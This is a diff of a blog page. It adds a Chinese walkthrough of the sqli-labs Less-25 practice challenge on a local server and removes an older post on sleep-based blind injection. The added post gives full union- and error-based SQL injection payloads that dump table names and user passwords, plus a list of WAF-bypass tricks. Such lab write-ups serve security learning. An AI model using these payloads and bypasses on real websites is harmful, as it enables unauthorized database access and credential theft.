@@ -64,6 +64,90 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-25" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/15/sql-labs-Less-25/" class="article-date">
+  <time datetime="2021-02-15T12:10:44.000Z" itemprop="datePublished">2021-02-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/15/sql-labs-Less-25/">sql-labs-Less-25</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/%EF%BC%8C%E8%BE%93%E5%85%A5?id=1%EF%BC%8C%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%E3%80%82">http://127.0.0.1/sql/Less-25/，输入?id=1，正常输出。</a><br>再输入’，发生报错，从报错信息来看这关的注入字符是’，再输入–+进行注释，正常输出，说明可以用’注入。<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;">http://127.0.0.1/sql/Less-25/?id=1&#39;</a> order by 3–+，发现报错：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/15/sql-labs-Less-25/1.png" alt="2"><br>发现报错语句中只有‘der by’，与我们输入的‘order by’不一样。<br>查看源代码：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/15/sql-labs-Less-25/1.png" alt="1"><br>发现对大小写的’or’和’and’进行了过滤，既输入的注入语句中的or和and会变为空。</p>
+<p>方法一（联合注入）：<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;">http://127.0.0.1/sql/Less-25/?id=1&#39;</a> oorrder by 3–+<br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,2,3–+<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,database(),3–+（<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),3–+）<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)–+</p>
+<p>方法二（报错注入）：<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,database()))–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’)))–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’)))–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select id from users limit 0,1)))–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select username from users limit 0,1)))–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select password from users limit 0,1)))–+<br>（这里不用group_concat函数是因为在报错语句在它的输出有字数限制(?)）</p>
+<h2>小结</h2>
+WAF绕过<br>
+1.sql注释符绕过
+（1） union /**/select  我们将union select之间的空格使用注释符进行替换（适用于对union select之间的空格进行检测的情况）<br>
+（2）union/*crow%0%32#*/select 我们在注释符中间填充内容<br>
+（3）union/*aaaaaaaaaabbbbbbbbbcccccccccccdddddddddddeeeeeeeeeeee%%%%%%%%%*/select  构造较大数据<br>
+（4）/*!union select*/内联注释        我们使用内联注释，mysql特有<br>
+2.空白符绕过   <br>           
+（1）mysql空白符：%09（TAB键（水平））；%0A（新建一行）;  %0B（TAB键（垂直））;  %0D（return功能）;  %20（空格）;  %0C（新的一页）;  %A0（空格）;  /*XXX*/<br>
+（2）正则空白符： %09；%0A;  %0B;  %0D;  %20; <br>
+     %25其实就是百分号  %25A0  就是空白符  <br>    
+3.函数分割符号<br>
+将一个函数进行分割concat()<br>
+ %25其实就是百分号  %25A0  就是空白符    <br>  
+concat%2520(<br>
+concat/**/(<br>
+concat%250c(<br>
+concat%25a0(<br>
+4.浮点数法<br>
+ waf对于id=1可以进行检测，但是对于id=1E0、id=1.0、id=\N可能就无法检测<br>
+5.利用error-based进行sql注入<br>
+extractvalue(1, concat(0x5c,md5(3)));<br>
+updatexml(1, concat(0x5d,md5(3)),1);<br>
+GeometryCollection((select*from(select*from(select@@version)f)x))<br>
+polygon((select*from(select name_const(version(),1))x))<br>
+linestring()<br>
+multipoint()<br>
+multilinestring()<br>
+multipolygon()<br>
+6.mysql特殊语法<br>
+select {x schema_name} from {x information_schema.schemata};<br>
+select {x 1};<br>
+7.大小写绕过<br>
+如果对关键字and、or、union等进行了过滤，可以考虑使用大小写混合的方法<br>
+Or  aNd  UniOn<br>
+但是很多时候有函数会部分大小写进行过滤，这个时候我们可以考虑使用双写的方法<br>
+8.关键字重复<br>
+OORr >> or (既Less-25的方法一)<br>
+9.关键字替换<br>
+如果还是无法绕过，可以考虑替换的方法<br>
+and >> &&    or >> ||(既Less-25的方法二)   like可以替换 =    <> 等价于 !=  --+、#可以替换为;%00 <br>
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/15/sql-labs-Less-25/" data-id="ckl6tiqeg0000hkux2cuug9qc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-24" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/14/sql-labs-Less-24/" class="article-date">
@@ -522,51 +606,6 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
 
 
   
-    <article id="post-sql-labs-Less-9-10" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/03/sql-labs-Less-9-10/" class="article-date">
-  <time datetime="2021-02-03T09:21:11.000Z" itemprop="datePublished">2021-02-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/03/sql-labs-Less-9-10/">sql-labs Less-9~10</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>Less-9</h1>
-进入http://127.0.0.1/sql/Less-8，输入/?id=1,正常输出，加上'，正常输出，再加上--+，还是正常输出，换其他字符尝试，还是正常输出。
-这时要换其他方法判断能不能注入以及注入字符，这里可以用延迟注入(?)，即在1'后面加and sleep(5)--+,如果能用'注入，则会在加载5秒后再输出，否则会较快的输出。
-接下来的步骤和Less-5~6或Less-8一样。
-
-<h1>Less-10</h1>
-和Less-9一样，只是把'换成"。
-
-<h1>小结</h1>
-延迟注入：用sleep函数，如果可以注入则会再加载指定时间后输出，否则会较快的输出。
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/03/sql-labs-Less-9-10/" data-id="ckkp9f5vo0000swux5wmihkxs" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -611,15 +650,15 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
           </li>
         
           <li>
+            <a href="/2021/02/20/sql-labs-Less-32~33-35/">sql-labs-Less-32~33</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/18/sql-labs-Less-29-31/">sql-labs-Less-29~31</a>
           </li>
         
           <li>
             <a href="/2021/02/17/sql-labs-Less-28-28a/">sql-labs-Less-28-28a</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/17/sql-labs-Less-27a/">sql-labs-Less-27a</a>
           </li>
         
       </ul>
